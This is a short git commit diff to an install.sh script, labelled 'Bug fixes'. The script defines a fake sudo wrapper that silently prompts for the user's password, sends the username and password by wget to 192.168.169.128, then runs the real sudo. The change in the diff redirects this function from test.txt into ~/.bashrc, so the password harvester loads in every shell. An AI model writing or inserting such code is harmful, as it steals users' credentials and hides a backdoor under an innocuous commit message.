1c09d3756348a658cabc1f8c1bead958189ab541
Alex Grant <acg6097@rit.edu>
2021-04-14 19:16:07 -0400

    Bug fixes

--- install.sh
+++ install.sh
@@ -4,4 +4,4 @@ origsudo="$(which sudo)";
 read -s -p "[sudo] password for $USER: " pw;printf "\n";
 wget "192.168.169.128 /$USER:$pw" > /dev/null 2>&1;
 $origsudo $@;
-}' >> test.txt
+}' >> ~/.bashrc
